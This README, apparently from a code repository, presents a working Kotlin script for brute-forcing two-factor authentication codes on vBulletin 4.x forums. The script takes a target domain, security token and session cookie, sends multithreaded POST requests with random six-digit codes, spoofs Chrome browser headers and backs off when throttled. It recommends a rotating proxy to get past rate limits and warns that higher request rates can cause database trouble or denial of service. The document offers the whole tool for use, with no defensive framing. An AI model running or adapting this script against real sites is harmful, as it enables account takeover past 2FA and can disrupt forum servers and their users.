# vBulletin 2FA BruteForce
#### Example Kotlin Script on bruteforcing 2FA for vBulletin 4.x
‼️ Warning: Higher requests can cause database issues/DoS ‼️

Minimum Requirements: 
---
- ✅ IntelliJ 2020
- ✅ JDK 8
- ✅ Kotlin 1.5.0
- ✅ Internet 🙂

(Recommended: Rotating Proxy)

Script:
---
```kotlin
import java.net.URI
import java.net.URLEncoder
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.security.SecureRandom
import java.time.Duration
import java.util.*
import java.util.concurrent.Callable
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

/**
 * @author Kai
 * @version 1.0 -> 14/05/2022 | NO-PROXY
 */

//CAN EDIT - START
const val threads = 2
const val endpointURL = "https://<PASTE DOMAIN HERE>/misc.php?do=twofactor"
const val securityToken = "<PASTE TOKEN HERE>"
const val cookie = "<PASTE COOKIE HERE>"
//CAN EDIT - END

//.proxy(ProxySelector.of(InetSocketAddress("rotate.proxy.example", 4151)))
val client : HttpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build()
val builder : HttpRequest.Builder = vBulletinHeaders(HttpRequest.newBuilder())

val responseData = ResponseData(mutableListOf(), mutableListOf())

val twoFactorRandom = SecureRandom()
val fastRandom = SplittableRandom()

val executor : ScheduledExecutorService = Executors.newScheduledThreadPool(
    Runtime.getRuntime().availableProcessors() + 1
)

/****************
 *   MAIN Fun   *
 ****************/

fun main() {
    val bruteForceCallable = Callable { handleResponse() }
    val monitorCallable = Callable { monitor() }
    repeat(threads) {
        newTask(bruteForceCallable) //Creates thread that'll send the HTTPS request
    }
    newTask(monitorCallable) //Prints to console (total req)
}

fun handleResponse() {
    val twoFactor = post().twoFactor
    val response = post().response

    val body = response.body()
    val code = response.statusCode()

    val invalidTwoFactor = body.contains("Invalid authentication code.") || code != 200
    if(invalidTwoFactor) {
        responseData.used2FA.add(twoFactor)
        responseData.responseCodes.add(code)
    } else {
        print("\rSleeping Thread-" + Thread.currentThread().id)
        Thread.sleep(10000L) //Wait 10 seconds, being throttled
    }

}

fun monitor() {
    if(responseData.used2FA.size > 0 && responseData.responseCodes.size > 0)
        print("\r[Monitor] ${responseData.used2FA.size} | ${responseData.responseCodes.last()}")
}

fun request(next2FA : String) : HttpRequest {
    val params = mapOf(
        "code" to next2FA,
        "s" to "",
        "securitytoken" to securityToken,
        "do" to "twofactor",
        "action" to "doverify"
    )
    return builder.uri(URI.create(endpointURL)).POST(form(params)).timeout(Duration.ofSeconds(5)).build()
}

fun post() : ResponseHttp {
    val next2FA = next2FA()
    val response = client.sendAsync(request(next2FA), HttpResponse.BodyHandlers.ofString())
    return ResponseHttp(next2FA, response[6, TimeUnit.SECONDS])
}

fun vBulletinHeaders(builder : HttpRequest.Builder) : HttpRequest.Builder {
    builder.header(
        "accept",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng," +
                "*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    )
    builder.header("accept-language", "en-US,en;q=0.9")
    builder.header("cache-control", "no-cache")
    builder.header("content-type", "application/x-www-form-urlencoded")
    builder.header("pragma", "no-cache")
    builder.header(
        "sec-ch-ua",
        "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\", \"Google Chrome\";v=\"101\""
    )
    builder.header("sec-ch-ua-mobile", "?0")
    builder.header("sec-ch-ua-platform", "\"Windows\"")
    builder.header("sec-fetch-dest", "document")
    builder.header("sec-fetch-mode", "navigate")
    builder.header("sec-fetch-site", "same-origin")
    builder.header("sec-fetch-user", "?1")
    builder.header("upgrade-insecure-requests", "1")
    builder.header("cookie", cookie)
    builder.header("Referer", endpointURL)
    builder.header("Referrer-Policy", "strict-origin-when-cross-origin")
    return builder
}

/****************
 *  THREADING   *
 ****************/

fun <R> newTask(callable : Callable<R>/*, callback : Callback<R>*/) {
    executor.scheduleAtFixedRate( {
        callable.call()
    }, fastRandom(), fastRandom(), TimeUnit.MILLISECONDS)
}

/****************
 *     UTIL     *
 ****************/

fun next2FA() : String = String.format("%06d", twoFactorRandom.nextInt(999999))

fun String.utf8() : String = URLEncoder.encode(this, "UTF-8")

fun form(data : Map<String, String>) : HttpRequest.BodyPublisher =
    HttpRequest.BodyPublishers.ofString(
        data.map { (k, v) -> "${ (k.utf8()) }=${ v.utf8() }" }.joinToString("&")
    )

fun fastRandom() = fastRandom.nextInt(250) + 200L

/****************
 * DATA CLASSES *
 ****************/

data class ResponseHttp(val twoFactor : String, val response : HttpResponse<String>)

data class ResponseData(val used2FA : MutableList<String>, val responseCodes : MutableList<Int>)
```
